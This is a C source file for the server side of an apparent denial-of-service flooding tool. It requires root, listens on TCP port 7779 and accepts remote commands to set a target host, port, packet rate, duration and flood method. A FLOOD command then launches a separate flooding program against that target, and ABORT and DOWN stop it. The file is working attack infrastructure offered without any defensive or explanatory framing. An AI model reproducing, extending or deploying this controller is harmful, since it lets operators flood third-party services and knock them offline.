#include "../../include/include.h"

#define SERVERPORT	7779

#define CMD_FLOOD	"FLOOD"
#define CMD_HOST	"HOST"
#define CMD_PORT	"PORT"
#define CMD_PPS		"PPS"
#define CMD_TIME	"TIME"
#define CMD_METHOD	"METHOD"
#define CMD_ABORT	"ABORT"
#define CMD_DOWN	"DOWN"

char	pps[1024];
char	time_[1024];
char	port[1024];
char	host[1024];
char	method[1024];
int	fd=-1, fdc=-1;
pid_t	curcmdpid=-1;
char	*prog=NULL;

static inline void msgl(const char *fmt, ...)
{
	va_list ap;

	va_start(ap, fmt);
	if (fmt) {
		fprintf(stdout, "[server.c]\t");
		(void)vfprintf(stdout, fmt, ap);
	}
	va_end(ap);
}

static inline void abortcmd(void)
{
	if (curcmdpid>0) {
		kill(curcmdpid, SIGKILL);
		waitpid(curcmdpid, NULL, 0);
		curcmdpid=-1;
		msgl("command aborted\n");
	}
}

static inline noreturn void down(void)
{
	msgl("DOWN\n");
	if (fdc>=0)
		close(fdc);
	if (fd>=0)
		close(fd);
	exit(0);
}

static inline void floodexec(char *cmd)
{
	char *args[64];
	pid_t pid;
	int i;

	i=0;
	cmd[strcspn(cmd, "\r\n")]='\0';
	args[i++]=strtok(cmd, " ");
	while ((args[i++]=strtok(NULL, " ")));
	if (!args[0]) return;

	pid=fork();
	if (pid==0) {
		execvp(args[0], args);
		down();
	}
	else if (pid>0)
		curcmdpid=pid;
}

void remove_spaces(char *str)
{
	int i=0,j=0;
	while (str[i]!='\0') {
		if (str[i]!=' ')
			str[j++]=str[i];
		i++;
	}
	str[j]='\0';
}

static inline void command(char *cmd)
{
	char first[100],rest[100],res[65535];

	memset(rest,0,sizeof(rest));
	memset(first,0,sizeof(first));

	cmd[strcspn(cmd,"\r\n")]='\0';
	sscanf(cmd,"%s %[^\n]",first,rest);

	remove_spaces(rest);
	remove_spaces(first);

	if (!(strncmp(first, CMD_ABORT, sizeof(CMD_ABORT)-1))) {
		abortcmd();
		return;
	}
	if (!(strncmp(first, CMD_HOST, sizeof(CMD_HOST)-1))) {
		memset(host,0,sizeof(host));
		snprintf(host,sizeof(host),"%s", rest);
		msgl("set host %s\n", host);
		return;
	}
	if (!(strncmp(first, CMD_PORT, sizeof(CMD_PORT)-1))) {
		memset(port,0,sizeof(port));
		snprintf(port,sizeof(port),"%s", rest);
		msgl("set port %s\n", port);
		return;
	}
	if (!(strncmp(first, CMD_PPS, sizeof(CMD_PPS)-1))) {
		memset(pps,0,sizeof(pps));
		snprintf(pps,sizeof(pps),"%s", rest);
		msgl("set pps %s\n", pps);
		return;
	}
	if (!(strncmp(first, CMD_TIME, sizeof(CMD_TIME)-1))) {
		memset(time_,0,sizeof(time_));
		snprintf(time_,sizeof(time_),"%s", rest);
		msgl("set time %s\n", time_);
		return;
	}
	if (!(strncmp(first, CMD_METHOD, sizeof(CMD_METHOD)-1))) {
		memset(method,0,sizeof(method));
		snprintf(method,sizeof(method),"%s", rest);
		msgl("set method %s\n", method);
		return;
	}
	if (!(strncmp(first, CMD_FLOOD, sizeof(CMD_FLOOD)-1))) {
		memset(res,0,sizeof(res));
		snprintf(res,sizeof(res),"./%s %s %s %s %s %s",
			prog,host,port,pps,time_,method);
		msgl("EXEC %s\n", res);
		floodexec(res);
		return;
	}
}

int main(int argc, char **argv)
{
	struct sockaddr_in	sin_s, sin_c;
	socklen_t		sin_clen;
	char			recvbuf[65535];
	ssize_t			n;

	assert(argc==2);
	if ((geteuid()!=0)) {
		msgl("ONLY SUDO RUN\n");
		down();
	}
	if (access(argv[1], F_OK)!=0) {
		msgl("program (%s) not found!\n", argv[1]);
		down();
	}
	else
		msgl("OK program (%s) found\n", argv[1]);
	prog=argv[1];

	msgl("attempted initiating\n");
	assert((fd=socket(AF_INET,SOCK_STREAM,0))>=0);

	memset(&sin_s, 0, sizeof(sin_s));
	sin_s.sin_family=AF_INET;
	sin_s.sin_addr.s_addr=INADDR_ANY;
	sin_s.sin_port=htons(SERVERPORT);

	assert((bind(fd,(struct sockaddr *)&sin_s, sizeof(sin_s))!=-1));
	msgl("waiting connection\n");
	assert((listen(fd,1))!=-1);

	sin_clen=sizeof(sin_c);
	assert((fdc=accept(fd, (struct sockaddr *)&sin_c, &sin_clen))!=-1);
	msgl("client connected (%s:%d)\n",
		inet_ntoa(sin_c.sin_addr), ntohs(sin_c.sin_port));

	for (;;) {
		memset(recvbuf,0,sizeof(recvbuf));
		n=read(fdc,recvbuf,sizeof(recvbuf));
		if (n<=0)
			break;
		msgl("client send command - %s", recvbuf);
		if (!(strncmp(recvbuf, CMD_DOWN, sizeof(CMD_DOWN)-1)))
			down();
		command(recvbuf);
	}

	down();
	return 0;
}
